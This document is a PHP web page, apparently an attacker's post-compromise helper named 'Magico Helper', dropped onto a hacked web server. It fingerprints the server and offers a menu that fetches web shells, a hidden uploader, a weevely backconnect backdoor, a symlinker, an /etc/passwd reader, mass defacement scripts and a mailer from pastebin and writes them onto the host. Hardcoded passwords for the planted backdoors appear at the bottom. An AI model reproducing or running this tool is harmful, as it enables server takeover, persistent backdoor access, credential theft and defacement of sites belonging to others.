<html>
<head>
<meta content="text/html; charset=ISO-8859-1"
http-equiv="content-type">
<title>.:! Magico HelpeR !:.</title>
</head>
<body style="background-color: black; color: rgb(0, 0, 0);"
alink="#ee0000" link="#0000ee" vlink="#551a8b">
<div style="text-align: left;"><span style="color: rgb(0, 153, 0);"></span><span
style="color: rgb(51, 204, 0); font-weight: bold;"><span
style="color: rgb(153, 153, 0);">.:!~@</span># </span><span
style="color: red; font-weight: bold;"><a href="https://www.facebook.com/magico.sec">Magico Helper</a></span><span
style="font-weight: bold;"> </span><span
style="color: rgb(51, 204, 0); font-weight: bold;">#<span
style="color: rgb(153, 153, 0);">@~!:.</span></span><span
style="color: white;"></span>
<span style="font-weight: bold;"></span><br>
<span style="font-weight: bold;"><img
style="width: 239px; height: 186px;" alt=""
src="http://localhost/d.jpg"></span><br>
<span style="font-weight: bold;"></span><small><span
style="color: rgb(0, 153, 0);"><big><small><b>.: <span
style="color: rgb(204, 153, 51);">Server InFo </span>:.</b></small></big></span></small><br>
<small><span style="color: rgb(0, 153, 0);"><big>
<small>---------------------------------------------------------------------------------------<br>
<?php 
set_time_limit(0);
error_reporting(0);
echo "<b>[#]<span style=\"color: rgb(51, 204, 0);\"> Server Software   : </span></b>".$_SERVER['SERVER_SOFTWARE']."<br>";
echo "<b>[#]<span style=\"color: rgb(51, 204, 0);\"> Server Admin      : </span></b>".$_SERVER['SERVER_ADMIN']."<br>";
echo "<b>[#]<span style=\"color: rgb(51, 204, 0);\"> User              : </span></b>".get_current_user()."<br>";
echo "<b>[#]<span style=\"color: rgb(51, 204, 0);\"> Server IP         : </span></b>".$_SERVER['SERVER_ADDR']."<br>";
echo "<b>[#]<span style=\"color: rgb(51, 204, 0);\"> Your IP           : </span></b>".$_SERVER["REMOTE_ADDR"]."<br>";
echo "<b>[#]<span style=\"color: rgb(51, 204, 0);\"> Uname             : </span></b>".php_uname()."<br>";
echo "<b>[#]<span style=\"color: rgb(51, 204, 0);\"> Php version       : </span></b>".phpversion()."<br>";
echo "<b>[#]<span style=\"color: rgb(51, 204, 0);\"> Dir               : </span></b>".getcwd()."<br>";
////////////////////////////////////
echo "<b>[#]<span style=\"color: rgb(51, 204, 0);\"> Safe Mode         : </span></b>";
	if(@ini_get('safe_mode') or strtolower(@ini_get('safe_mode')) == 'on'){
		echo "<span style=\"font-weight: bold; color: red;\">On</span>";
		
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>"; }
echo "<br>";
//////////////////////////////////
echo "<b>[#]<span style=\"color: rgb(51, 204, 0);\"> Curl                 :</span></b>";
	if(function_exists("curl_version")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}

echo " - <b>[#]<span style=\"color: rgb(51, 204, 0);\"> Perl                 :</span></b>";
	if(function_exists("perl -h")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}

echo " - <b>[#]<span style=\"color: rgb(51, 204, 0);\"> Python                 :</span></b>";
	if(function_exists("python -h")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}
	
echo " - <b>[#]<span style=\"color: rgb(51, 204, 0);\"> Bash                 :</span></b>";
	if(function_exists("bash -h")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}

echo " - <b>[#]<span style=\"color: rgb(51, 204, 0);\"> Mysql                 :</span></b>";
	if(function_exists("mysql_connect")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}
	
echo " - <b>[#]<span style=\"color: rgb(51, 204, 0);\"> Mssql                 :</span></b>";
	if(function_exists("mssql_connect")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}

echo " - <b>[#]<span style=\"color: rgb(51, 204, 0);\"> Oracle                 :</span></b>";
	if(function_exists("ocilogon")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}
	
echo " - <b>[#]<span style=\"color: rgb(51, 204, 0);\"> Postgrase                 :</span></b>";
	if(function_exists("pg_connect")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}

//////////////////////////////////
echo "<br><b>[#]<span style=\"color: rgb(51, 204, 0);\"> Disable_functions  : </span></b>";

	$disable_funs = @ini_get('disable_functions');
	$arr = explode(',', $disable_funs);
	foreach($arr as $fun){
		echo "<span style=\"font-weight: bold; color: red;\">$fun</span>"." - ";
	}


/* or
	$funs =array("system","exec","shell_exec","passthru","ln","copy","symlink","show_source","mail");
		foreach($funs as $fun){
			if(!function_exists($fun)){
				echo $fun." - ";
			}
		}*/
//////////////////////////////
echo"<br>";
echo"---------------------------------------------------------------------------------------------------------------------------------------------------<br><br>";
echo'<form method="post">
<b>[#]<span style=\"color: rgb(51, 204, 0);\"> Tools Grabber : <b></span><select name="tools" >
<option>===================</option>
<option>hidden uploader</option>
<option>k2ll33d shell</option>
<option>x shell</option>
<option>webr00t</option>
<option>fwso shell</option>
<option>awso shell</option>
<option>mass</option>
<option>/etc/passwd</option>
<option>server users</option>
<option>backconnect weevely</option>
<option>turbo cpanel</option>
<option>symlinker</option>
<option>adminer</option>
<option>mailer</option>
<option>Magico pws</option>
<option>safe mode</option>
<option>404 shell</option>
<option>wp mass info changer</option>
<option>jo mass info changer</option>

</select>
<input type="submit" name="get" value="Get" />
</form>';
/////////////////////////////////////////////////////////////////
if(isset($_POST['get'])){
	switch($_POST['tools']){
	
		case "x shell":
		echo gino('http://pastebin.com/raw.php?i=vYzbTTs8','oop.php');
		break;
		//////////////////////////////////////////////
		case "webr00t":
		echo gino('http://pastebin.com/raw.php?i=N5q1T1SH','r00t.php');
		break;
		//////////////////////////////////////////////
		case "hidden uploader":
		echo gino('http://pastebin.com/raw.php?i=gtKnzWyB','upx.php');
		break;
		//////////////////////////////////////////////
		case "awso shell":
		echo gino('http://pastebin.com/raw.php?i=0USmsjpW','awso.php');
		break;	
		//////////////////////////////////////////////
		case "mass":
		echo gino('http://pastebin.com/raw.php?i=KbMUxa0c','mass.php');
		break;	
		//////////////////////////////////////////////
		case "/etc/passwd":
		echo gino('http://pastebin.com/raw.php?i=KbwUY0aR','passwd.php');
		break;		
		//////////////////////////////////////////////
		case "k2ll33d shell":
		echo gino('http://pastebin.com/raw.php?i=8mwwA4V2','k.php');
		break;				
		//////////////////////////////////////////////
		case "fwso shell":
		echo gino('http://pastebin.com/raw.php?i=f2VWCsNY','fwso.php');
		break;			
		//////////////////////////////////////////////
		case "adminer":
		echo gino('http://pastebin.com/raw.php?i=BZHXtZqu','adminer.php');
		break;	
		//////////////////////////////////////////////
		case "backconnect weevely":
		echo gino('http://pastebin.com/raw.php?i=6YkfqzQ1','bc.php');
		break;			
		//////////////////////////////////////////////
		case "turbo cpanel":
		echo gino('http://pastebin.com/raw.php?i=svbEfUPF','turbo.php');
		break;			
		//////////////////////////////////////////////
		case "symlinker":
		echo gino('http://pastebin.com/raw.php?i=NX74fQQU','symv4.php');
		break;		
		//////////////////////////////////////////////
		case "server users":
		echo gino('http://pastebin.com/raw.php?i=5VKD1nEk','users.php');
		break;			
		//////////////////////////////////////////////
		case "mailer":
		echo gino('http://pastebin.com/raw.php?i=9zzgByV6','wp-mailer.php');
		break;
		//////////////////////////////////////////////
		case "Magico pws":
		echo gino('http://pastebin.com/raw.php?i=5EUWbPRv','pws.php');
		break;
		//////////////////////////////////////////////
		case "safe mode":
		echo gino('http://pastebin.com/raw.php?i=Te1e1uhA','php.ini');
		break;
		//////////////////////////////////////////////
		case "404 shell":
		echo gino('http://pastebin.com/raw.php?i=6caNG1Jf','404.php');
		break;		
		//////////////////////////////////////////////
		case "wp mass info changer":
		echo gino('http://pastebin.com/raw.php?i=v55JUXQp','wp-masser.php');
		break;
		//////////////////////////////////////////////
		case "jo mass info changer":
		echo gino('http://pastebin.com/raw.php?i=sjrCVapz','jo-masser.php');
		break;
				
	
		} // switch end
}// end if
////////////////////////////////////////////////////////////////
// by INJECTOR_MA
function gino($input,$output){
	@mkdir('gino');
	@chdir('./gino');
	
	if(!file_exists($output)){
		
	$cn = @file_get_contents($input);
	$save = fopen("$output","a+"); fwrite($save,@file_get_contents($input)); fclose($save);
	return "<br>[#]DoNe: <a href=\"./gino/$output\"> Go to Here </a>";
	}else{ return "<br>[#] Allready Here : <a href=\"./gino/$output\"> Go to Here </a>"; }
	
}				
///////////////////////////////////////////////////////////////

?>

<br><br><br><br>
<span style="color: rgb(0, 153, 0);">[#]</span> <span
style="color: rgb(0, 153, 0);"><span style="color: rgb(51, 204, 0);"><span
style="color: rgb(153, 51, 153);">Please
Notice</span> :</span> the password of the <span
style="color: rgb(51, 204, 0);">[ weevely backdoor</span> ] is <span
style="color: rgb(153, 153, 0);">123456</span></span>
<br>
<span
style="color: rgb(0, 153, 0);">[#] the user of [<span
style="color: rgb(51, 204, 0);"> fwso shell</span>
] is <span style="color: rgb(153, 153, 0);">magico</span> and the
password is <span style="color: rgb(153, 153, 0);">xmagico</span></span>
<span style="color: rgb(0, 153, 0);"></span>
<br>
<span style="color: rgb(0, 153, 0);">[#] to view <span
style="color: rgb(51, 204, 0);">the hidden uplouder</span> write (<span
style="color: rgb(153, 153, 0);">up.php?x=x</span>) </span><br>
<span style="color: rgb(0, 153, 0);">[#] The Pass of <span
style="color: rgb(51, 204, 0);">404 shell</span> is</span><span
style="color: rgb(255, 204, 51);"> <span
style="color: rgb(204, 153, 51);">xmagico</span></span>
<br><b>...::::::: https://www.facebook.com/magico.sec ::::::::...</b>

</big></span></body></html>
